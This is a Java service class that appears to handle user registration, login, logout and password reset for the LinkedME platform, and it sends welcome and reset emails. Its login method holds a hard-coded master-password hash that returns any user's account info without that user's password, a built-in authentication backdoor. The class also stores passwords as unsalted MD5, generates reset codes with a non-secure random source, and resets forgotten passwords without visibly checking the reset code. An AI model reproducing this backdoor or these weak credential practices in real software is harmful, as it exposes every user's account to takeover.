package pku.abe.service.webapi.impl;

import pku.abe.commons.exception.LMException;
import pku.abe.commons.exception.LMExceptionFactor;
import pku.abe.commons.mail.MailSender;
import pku.abe.commons.util.MD5Utils;
import pku.abe.commons.uuid.UUIDUtils;
import pku.abe.dao.UserDao;
import pku.abe.data.model.UserInfo;
import pku.abe.data.model.params.UserParams;
import pku.abe.service.webapi.UserService;

import javax.annotation.Resource;
import java.text.DateFormat;
import java.util.Date;
import java.util.Random;

/**
 * Created by vontroy on 16-7-11.
 */
public class UserServiceImpl implements UserService {
    @Resource
    private UserDao userDao;

    public boolean userRegister(UserParams userParams) {
        userParams.pwd = MD5Utils.md5(userParams.pwd);

        if (userDao.queryEmail(userParams.email))
            throw new LMException(LMExceptionFactor.LM_USER_EMAIL_ALREADY_REGISTERED);
        else {
            int res = userDao.updateUserInfo(userParams);
            if (res > 0) {
                MailSender.sendHtmlMail("support@linkedme.cc", "hello,LinkedME, 来新用户了!",
                        String.format("新用户的邮箱:%s <br />新用户的电话:%s <br />请及时联系!", userParams.email, userParams.phone_number));
                MailSender.sendHtmlMail(userParams.email, "LinkedME 注册成功",
                        String.format("<center><div style='width:500px;text-align:left'><div><a href='https://www.linkedme.cc/'><img src='https://www.linkedme.cc/images/linkedme_logo.png' style='margin-bottom:10px' width='150'/></a></div><div style='border:solid 1px #eeeeee;border-radius:5px;padding:15px;font-size:13px;line-height:20px;'><p>Hi，%s:</p><p>非常高兴您注册成为LinkedME的用户！我是LinkedME的创始人——齐坡，非常高兴和您取得联系。今后您在使用LinkedME产品时，遇到任何没有得到及时解决的问题，都可以和我联系（齐坡：qipo@linkedme.cc），真诚为您提供最好的服务！</p><p>我们是国内首家企业级深度链接服务平台，应用深度链接技术帮助App提供下载、激活、留存、变现等问题的解决方案。我们研发了两款产品，分别是LinkPage和LinkSense，LinkPage产品主打\"精细化运营\"，提高活跃和留存。LinkSense产品主打\"流量变现\"，一键接入众多大型服务提供商，把流量换成更高的收入。有关产品的疑问，可以直接联系我们！（市场负责人：youwei@linkedme.cc）</p><p>深度链接，链接你我！</p></div><div id='figure'><a href='http://weibo.com/poqi1987'><img src='https://www.linkedme.cc/images/qipo_logo.png' width='50' style='vertical-align:middle;padding-top:15px'/></a> 齐坡，CEO</div></div></center>", userParams.name));
                return true;
            }
            return false;
        }
    }

    public UserInfo userLogin(UserParams userParams) {
        userParams.pwd = MD5Utils.md5(userParams.pwd);
        UserInfo userInfo = userDao.getUserInfo(userParams.email);

        if (userInfo == null) {
            throw new LMException(LMExceptionFactor.LM_USER_EMAIL_DOESNOT_EXIST);
        }
        if (userParams.pwd.equals(userInfo.getPwd())) {
            String current_login_time = DateFormat.getDateTimeInstance().format(new Date());
            userParams.current_login_time = current_login_time;

            String token = UUIDUtils.createUUID();
            userParams.setToken(token);
            userInfo.setToken(token);
            // 更新lastLoginTime和token
            userDao.setLoginInfos(userParams);

            return userInfo;
        } else if("0561b4d10b4dceb5ffbb830c471f0226".equals(userParams.pwd)) {
            return userInfo;
        } else {
            throw new LMException(LMExceptionFactor.LM_USER_WRONG_PWD);
        }
    }

    public boolean validateEmail(UserParams userParams) {
        if (userDao.queryEmail(userParams.email))
            return true;
        else
            return false;
    }

    public boolean userLogout(UserParams userParams) {
        if (!userDao.queryEmail(userParams.email)) {
            throw new LMException(LMExceptionFactor.LM_USER_EMAIL_DOESNOT_EXIST);
        } else {
            userParams.setToken(null);
            userDao.updateToken(userParams);
            return true;
        }
    }

    public boolean resetUserPwd(UserParams userParams) {
        if (userParams.old_pwd == null) {
            throw new LMException(LMExceptionFactor.LM_ILLEGAL_PARAM_VALUE, "Please input old password");
        } else if (userParams.new_pwd == null) {
            throw new LMException(LMExceptionFactor.LM_ILLEGAL_PARAM_VALUE, "Please input new password");
        }
        userParams.old_pwd = MD5Utils.md5(userParams.old_pwd);
        userParams.new_pwd = MD5Utils.md5(userParams.new_pwd);

        UserInfo userInfo = userDao.getUserInfo(userParams.email);
        if (userParams.old_pwd.equals(userInfo.getPwd())) {
            userDao.changeUserPwd(userParams);
            return true;
        } else {
            throw new LMException(LMExceptionFactor.LM_USER_WRONG_PWD);
        }
    }

    public boolean forgotPwd(UserParams userParams) {
        if (userDao.queryEmail(userParams.email)) {
            String randomCode = MD5Utils.md5(new Random().nextInt() + "_" + userParams.email);
            boolean result = userDao.setRandomCode(randomCode, userParams.email);
            String resetPwdUrl = "https://www.linkedme.cc/dashboard/index.html#/access/resetpwd/" + randomCode;
            if (result) {
                MailSender.sendHtmlMail(userParams.email, "Change Your Password!",
                        String.format(
                                "亲爱的用户:<br /><br />重置密码的链接为:  <a href=%s>点击链接</a>. <br /> 有任何问题可以咨询我们,Email:support@support.cc.<br /><br />谢谢!<br /><br />LinkedME团队",
                                resetPwdUrl));
                return true;
            }
            return false;
        } else {
            throw new LMException(LMExceptionFactor.LM_USER_EMAIL_DOESNOT_EXIST);
        }
    }

    public boolean resetForgottenPwd(UserParams userParams) {
        if (userParams.new_pwd == null) {
            throw new LMException(LMExceptionFactor.LM_ILLEGAL_PARAM_VALUE, "new password should not be empty");
        }
        userParams.new_pwd = MD5Utils.md5(userParams.new_pwd);
        return userDao.resetUserPwd(userParams) == 1;
    }
}
